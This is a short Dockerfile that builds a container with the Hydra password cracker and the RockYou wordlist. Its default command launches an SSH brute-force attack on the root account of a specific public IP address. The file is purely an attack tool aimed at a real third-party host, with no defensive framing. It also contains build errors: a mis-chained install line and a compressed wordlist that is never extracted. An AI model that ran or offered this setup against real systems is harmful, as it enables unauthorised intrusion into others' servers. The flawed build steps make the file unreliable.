FROM 		ubuntu:latest

RUN		apt-get -qq update 			&&\
		apt-get -y install	hydra		&&\
					openssl

RUN		wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2

ADD		rockyou.txt	dico
#ENTRYPOINT 	hydra
CMD		["hydra","-l", "root", "-P", "dico", "-t", "1", "-w", "5", "-s", "22", "-f", "-V", "80.67.190.119", "ssh"]
